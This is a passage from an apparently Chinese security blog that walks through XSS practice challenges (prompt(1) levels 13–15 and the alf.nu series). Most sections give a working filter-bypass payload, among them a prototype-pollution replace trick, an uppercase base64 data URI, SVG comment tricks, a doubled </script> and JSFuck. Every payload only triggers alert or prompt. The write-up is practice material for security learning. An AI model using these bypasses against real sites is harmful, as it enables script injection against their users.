+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">'abcdef'</span>.<span class="built_in">replace</span>(<span class="string">'cd'</span>,<span class="string">'$`123'</span>)</span><br><span class="line">&lt; <span class="string">"abab123ef"</span></span><br></pre></td></tr></table></figure>
+<p>当要替换的值中有$`的值时，会是上面这种匹配情况</p>
+<p>最后的payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"source"</span>:&#123;&#125;,<span class="attr">"__proto__"</span>:&#123;<span class="attr">"source"</span>:<span class="string">"$`onerror=prompt(1)&gt;"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>终极复杂了，可以说没怎么看懂</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/20.png" alt></p>
+<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>好吧，其实一开始想到了尝试<code>base64</code>的形式，但是base64是大小写敏感，这里的<code>toUpperCase()</code>让我不知道怎么处理</p>
+<p>看了writeup，构造出了一个base64全为大写的payload</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;IFRAME/SRC="</span>x:text/html;base<span class="number">64</span>,ICA<span class="number">8</span>U<span class="number">0</span><span class="symbol">NSSVBUIC8</span>KU<span class="number">1</span>JDCSA<span class="number">9</span>SFRUUF<span class="name">M6</span>UE<span class="number">1</span>UMS<span class="number">5</span><span class="symbol">NTD4</span>JPC<span class="number">9</span>TQ<span class="number">1</span>JJUFQJPD<span class="number">4</span>=</span><br></pre></td></tr></table></figure>
+<p>由于无法将url指定到我的服务器，所以暂时也无法复现</p>
+<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>level7的升级版本，最主要的就是过滤了<code>*</code>，于是就不能用<code>/*</code>、<code>*/</code>的方式来过滤</p>
+<p>这里主要是利用<code>&lt;svg&gt;</code>这种外部元素，会对其中的字符进行xml解析，也就导致了<code>&lt;!--</code>、<code>--&gt;</code>这种过滤符可以被使用</p>
+<p>然后利用这个特性，就可以构造出payload了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--#--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="comment">&lt;!--#--&gt;</span>prompt(<span class="comment">&lt;!--#--&gt;</span>1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/21.png" alt></p>
+<h1 id="alf-nu"><a href="#alf-nu" class="headerlink" title="alf.nu"></a>alf.nu</h1><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>闭合即可</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");alert(1);//</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/22.png" alt></p>
+<h2 id="adobe"><a href="#adobe" class="headerlink" title="adobe"></a>adobe</h2><p>转移了<code>&quot;</code>,那就另起一个<code>script</code>标签</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="number">1</span>);<span class="comment">//</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/23.png" alt></p>
+<h2 id="json"><a href="#json" class="headerlink" title="json"></a>json</h2><p>一样的操作</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="number">1</span>);<span class="comment">//</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/24.png" alt></p>
+<h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><p>好吧，有点菜了，看不到实时生成的html代码就有点蒙蔽</p>
+<p>由于之里会将url带入href的部分，会经过一次url解码，导致可以利用url编码的方式绕过</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="number">22</span>);alert<span class="comment">(1)</span>;<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/25.png" alt></p>
+<h2 id="markdown"><a href="#markdown" class="headerlink" title="markdown"></a>markdown</h2><p>有两个对于markdown语法的正则替换</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>);</span><br><span class="line">  <span class="comment">// URLs</span></span><br><span class="line">  text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);</span><br><span class="line">  <span class="comment">// [[img123|Description]]</span></span><br><span class="line">  text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);</span><br><span class="line">  <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一开始是想到了将两个标签混合在一起，但还是差了点东西</p>
+<p>最后看了writeup的payload</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[[a|http://onerror=alert(1)//]]</span></span><br></pre></td></tr></table></figure>
+<p>这样之后，就会生成,从而产生xss</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">"&lt;a href="</span><span class="attr">http:</span>//<span class="attr">onerror</span>=<span class="string">alert(1)//</span>" <span class="attr">src</span>=<span class="string">"a.gif"</span>&gt;</span>"&gt;http://onerror=alert(1)//]]<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/26.png" alt></p>
+<h2 id="dom"><a href="#dom" class="headerlink" title="dom"></a>dom</h2><p>输入<code>TextNode</code>或者一些<code>Script</code>标签时，后面的内容部分都会被转译成html实体，导致无法逃逸</p>
+<p>这里的方法是输入一个Comment也就是注释标签，例如</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Commnet#</span><span class="bash"><span class="built_in">test</span></span></span><br></pre></td></tr></table></figure>
+<p>就会生成一个</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--test--&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样，我们只要闭合了前面的<code>&lt;!--</code>，后面的部分就能自由发挥了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Comment#--&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/27.png" alt></p>
+<h2 id="callback"><a href="#callback" class="headerlink" title="callback"></a>callback</h2><p>好吧，这题本来不应该没想到的，感觉潜意识里一直想用双引号来闭合，倒是忘了单引号</p>
+<p>最后payload</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'#'</span>;alert<span class="comment">(1)</span>;<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/28.png" alt></p>
+<h2 id="skandia"><a href="#skandia" class="headerlink" title="skandia"></a>skandia</h2><p>把所有输入转换成了大写的</p>
+<p>一开始是想从外部服务器引入js文件的，后来发现好像不支持连外网</p>
+<p>于是看了writeup之后发现是利用data协议，进行html编码绕过大写</p>
+<p>payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">");<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>  <span class="attr">src</span>=<span class="string">data:text/html,%61%6c%65%72%74(1)</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="comment">//</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/29.png" alt></p>
+<h2 id="tempalte"><a href="#tempalte" class="headerlink" title="tempalte"></a>tempalte</h2><p>有点复杂，先空着</p>
+<h2 id="json-2"><a href="#json-2" class="headerlink" title="json 2"></a>json 2</h2><p>感觉做这个之前还是有一个逻辑没理清，就是解码顺序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A(html解码)--&gt;B(javascript解码)</span><br><span class="line">B--&gt;C(url解码)</span><br></pre></td></tr></table></figure>
+<p>因此<code>&lt;/script&gt;</code>标签在<code>script</code>标签中有最终的闭合权，无论是在引号还是在别的地方，因为第一次html解码时，是不会解析其中的js代码，只会去识别标签。</p>
+<p>从而这里就可以利用双写的方式，来构造<code>&lt;/script&gt;</code>标签，从而闭合标签，造成xss</p>
+<p>payload</p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">s</span>&lt;/<span class="attr">scriptcript</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="number">1</span>);<span class="comment">//</span></span></span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/30.png" alt></p>
+<h2 id="callback-2"><a href="#callback-2" class="headerlink" title="callback 2"></a>callback 2</h2><p>虽然是自己写出来的，但是有点蒙的成分，有个小trick</p>
+<p><code>&lt;!--</code>在js中也可以当作单行注释来用，然而之前的<code>--&gt;</code>只能在行头使用</p>
+<p>payload</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">'alert</span>#<span class="number">123</span>';alert(<span class="number">1</span>); &lt;!<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/31.png" alt></p>
+<h2 id="skandia-2"><a href="#skandia-2" class="headerlink" title="skandia 2"></a>skandia 2</h2><p>无法使用<code>&lt;</code>、<code>&gt;</code>来闭合标签</p>
+<p>一开始想利用<code>toUpperCase</code>的特性，找两个转为大写后变成<code>&lt;</code>、<code>&gt;</code>的unicode字符</p>
+<p>最后，想起里啊一个神奇的东西，jsfuck！</p>
+<p>于是用jsfuck就可以轻松过关</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">");[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]][<span class="string">([</span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]((![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+[<span class="string">+[</span>]]]+[<span class="string">+!+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/32.png" alt></p>
+<h1 id="Reference-Link"><a href="#Reference-Link" class="headerlink" title="Reference Link"></a>Reference Link</h1><p><a href="http://heartsky.info/2016/07/11/prompt-1-writeup/" target="_blank" rel="noopener">http://heartsky.info/2016/07/11/prompt-1-writeup/</a></p>
+<p><a href="http://pupiles.com/xss.html" target="_blank" rel="noopener">http://pupiles.com/xss.html</a></p>
+<p><a href="https://lorexxar.cn/2015/07/02/xss-p/" target="_blank" rel="noopener">https://lorexxar.cn/2015/07/02/xss-p/</a></p>
+<p><a href="https://blog.csdn.net/he_and/article/details/79672900" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/79672900</a></p>
+<p><a href="http://heartsky.info/2016/07/13/alert-1-writeup/" target="_blank" rel="noopener">http://heartsky.info/2016/07/13/alert-1-writeup/</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/08/网鼎杯writeup-web/" data-toggle="tooltip" data-placement="top" title="网鼎杯writeup-web">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/08/redis未授权访问与ssrf利用/" data-toggle="tooltip" data-placement="top" title="redis未授权访问与ssrf利用">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#练习记录" title="练习记录">练习记录</a>
+                        
+                          <a class="tag" href="/tags/#xss" title="xss">xss</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
